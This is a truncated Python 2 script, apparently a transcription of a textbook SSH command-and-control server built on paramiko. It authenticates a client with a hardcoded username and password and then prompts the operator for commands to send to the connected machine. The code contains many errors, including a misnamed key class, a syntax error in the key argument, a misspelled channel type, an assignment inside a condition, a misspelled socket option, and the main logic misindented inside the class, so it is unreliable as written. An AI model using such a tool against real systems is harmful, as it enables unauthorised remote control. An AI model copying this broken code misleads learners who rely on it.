import socket
import paramiko
import threading
import sys
#using the key from the paramiko file
host_key = paramiko.RSAkey(filename= :'test_rsa.key')
class Server(paramiko.ServerInterface):
    def _init(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanId):
        if kind == 'seesion':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if(username == 'khanh') and (password = 'pip_python'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    server = sys.argv[1]
    ssh_port = int(sys.argv[2])
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSERADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print '[+] Listening for connection ...'
        client, addr = sock.accept()
    except Exception, ex:
        print '[-] Listen failed: ' + str(ex)
        sys.exit(1)
    print '[+] Got a connection!'
    
    try:
        bhSession = paramiko.Transport(client)
        bhSession.add_server_key(host_key)
        server = Server()
        try:
            bhSession.start_server(server = server)
        except paramiko.SSHException, ex:
            print '[-] SSH negotiation failed.'
        chan = bhSession.accept(20)
        print '[+] Authenticated!'
        print chan.recv(1024)
        chan.send('Welcome To bh_ssh')
        while True:
            try:
                command = raw_input("Enter command:")
